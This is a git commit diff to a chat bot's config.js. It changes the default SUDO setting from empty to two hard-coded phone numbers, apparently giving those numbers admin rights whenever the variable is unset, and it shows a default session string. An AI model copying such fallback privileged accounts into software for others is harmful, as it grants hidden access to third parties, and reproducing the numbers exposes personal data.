aeb952f1264fedf88dbf8a3dcc18ef8716b93c93
Xirtexe <168110046+Xirtexe@users.noreply.github.com>
2024-06-26 12:57:44 +0530

    Update config.js

--- config.js
+++ config.js
@@ -12,7 +12,7 @@ module.exports = {
   LOG_MSG: toBool(process.env.LOG_MSG) || true,
   READ_CMD: toBool(process.env.READ_CMD),
   READ_MSG: toBool(process.env.READ_MSG),
-  SUDO: process.env.SUDO || '',
+  SUDO: process.env.SUDO || '919539612761,917025673121',
   SESSION: process.env.SESSION || "bot--BYgcswHY",
   DATABASE:
     DATABASE_URL === "./database.db"
